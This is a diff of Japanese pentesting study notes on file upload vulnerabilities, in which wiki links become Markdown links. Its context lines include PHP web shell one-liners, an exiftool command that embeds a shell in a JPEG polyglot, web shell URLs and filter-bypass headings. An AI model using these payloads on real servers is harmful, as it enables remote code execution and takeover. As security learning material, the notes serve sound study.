@@ -13,7 +13,7 @@
 
 ## 1. Webサイトの技術スタックを調査
 
-- [[2. フィルタリングの種類とバイパス#Enumeration]]
+- [2. フィルタリングの種類とバイパス](2.%20フィルタリングの種類とバイパス.md#Enumeration)
 - Wappalyzerを使用する（ただし、精度は100%ではない）。
 - Burp Suiteを用いてレスポンスヘッダーの`server`や`x-powered-by`を確認。
 - 攻撃の足がかりとなりそうなアップロードページを特定。
@@ -65,12 +65,12 @@ gobuster dir -u http://<TargetIP>/<path> -x .<拡張子>
 #### エクスプロイト
 
 - ブラックリスト方式
-	- [[#ファイル拡張子の難読化によるバイパス]]
+	- [⚡️File upload vuln](⚡️File%20upload%20vuln.md#ファイル拡張子の難読化によるバイパス)
 
 - ホワイトリスト方式
-	- [[#サーバ設定の上書きによるバイパス]]
-	- [[#Exiftoolによるpolyglot作成によるコンテンツ検証の回避実践]]
-	- [[#Content-Typeフィルタバイパス実践]]
+	- [⚡️File upload vuln](⚡️File%20upload%20vuln.md#サーバ設定の上書きによるバイパス)
+	- [⚡️File upload vuln](⚡️File%20upload%20vuln.md#Exiftoolによるpolyglot作成によるコンテンツ検証の回避実践)
+	- [⚡️File upload vuln](⚡️File%20upload%20vuln.md#Content-Typeフィルタバイパス実践)
 
 ### Magic Number フィルタ
 
@@ -110,7 +110,7 @@ file exploit.php
 
 7. 上記のファイルをアップロードする
 
-もしくは、[[#Exiftoolによるpolyglot作成によるコンテンツ検証の回避実践]]
+もしくは、[⚡️File upload vuln](⚡️File%20upload%20vuln.md#Exiftoolによるpolyglot作成によるコンテンツ検証の回避実践)
 
 ### MIME タイプフィルタ
 
@@ -121,7 +121,7 @@ file exploit.php
 
 #### エクスプロイト
 
-- [[#Content-Typeフィルタバイパス実践]]
+- [⚡️File upload vuln](⚡️File%20upload%20vuln.md#Content-Typeフィルタバイパス実践)
 
 ### ファイルサイズフィルタ
 
@@ -169,9 +169,9 @@ GET /files/uploaded/path/exploit.php?cmd=[ShellCommand]
 
 ## 基本
 
-- 1段階目の防衛策は[[#Content-Type制限]]
+- 1段階目の防衛策は[⚡️File upload vuln](⚡️File%20upload%20vuln.md#Content-Type制限)
 - 2段階目：Content-Type制限が突破されても、スクリプトを実行させないようにする
-- [[1. File upload脆弱性の基本と対策#事前知識：サーバは静的なファイルをどう処理するのか]]の3にあるように、 executable + サーバがファイルを実行しない設定 → エラー or Plain text
+- [1. File upload脆弱性の基本と対策](1.%20File%20upload脆弱性の基本と対策.md#事前知識：サーバは静的なファイルをどう処理するのか)の3にあるように、 executable + サーバがファイルを実行しない設定 → エラー or Plain text
 	- つまり、実行可能ファイルをアップロードできない場合にトライする。
 
 - plain textで返された場合の挙動
@@ -187,7 +187,7 @@ Content-Length: 39
 
 <?php echo system($_GET['command']); ?>
 ```
-- [[1. 情報開示の基本と対策]]へとつながるかもだが、Web shellは難しくなる
+- [1. 情報開示の基本と対策](../Information%20disclosure/1.%20情報開示の基本と対策.md)へとつながるかもだが、Web shellは難しくなる
 
 ### 特定ディレクトリの実行制限バイパス概要
 
@@ -223,7 +223,7 @@ Content-Type: text/php
 	- 例えば、`http://TARGET_NET/files/shell.php`を開くとWeb shellを実行できるようになる
 	- ファイルパスは正規の拡張子ファイルをアップロードすることでわかることがある
 
-- 必要に応じて[[Path traversal#サニタイジング等の防御を突破する方法]]を使用する
+- 必要に応じて[Path traversal](../Path%20traversal/Path%20traversal.md#サニタイジング等の防御を突破する方法)を使用する
 
 ## 応用：rootユーザーのSSHのauthorized_keys上書き
 
@@ -374,7 +374,7 @@ http://<TargetIP>/<path>/shell.jpg?cmd=whoami
 - [HackTricks: Bypass file extensions check](https://book.hacktricks.xyz/pentesting-web/file-upload#bypass-file-extensions-checks)をファイル名ごと総当たり
 - うまくいったリクエストでファイル名を実際のファイル名に変更する
 - 用途：ファイルがブラックリストのとき
-	- 💡これでうまくいかないときは[[#悪意あるファイルへの不十分なブラックリスト]]を試す
+	- 💡これでうまくいかないときは[⚡️File upload vuln](⚡️File%20upload%20vuln.md#悪意あるファイルへの不十分なブラックリスト)を試す
 
 ## ブラックリスト回避テクニック
 ### 汎用 (`a.xxx`)
@@ -402,7 +402,7 @@ http://<TargetIP>/<path>/shell.jpg?cmd=whoami
 ## コンテンツ検証の回避概要
 
 - *ExifTool*を使用し、メタデータ内に悪意のあるコードを含むポリグロットJPEGファイルを作成する
-	- [[📕#ポリグロット(polyglot)]] [[📕#メタデータ]]
+	- [📕](../../Misc/📕.md#ポリグロット(polyglot)) [📕](../../Misc/📕.md#メタデータ)
 
 ## Exiftoolによるpolyglot作成によるコンテンツ検証の回避実践
 
@@ -427,7 +427,7 @@ exiftool -Comment="<?php echo system($_GET['cmd']); ?>" image.jpg -o polyglot.ph
 ```
 https://EXPLOIT_DOMAIN/shell.php#hoge.jpg
 ```
-- [[2.  一般的なSSRF防御の回避#SSRF ホワイトリスト回避]]
+- [2.  一般的なSSRF防御の回避](../SSRF/2.%20%20一般的なSSRF防御の回避.md#SSRF%20ホワイトリスト回避)
 
 ---
 
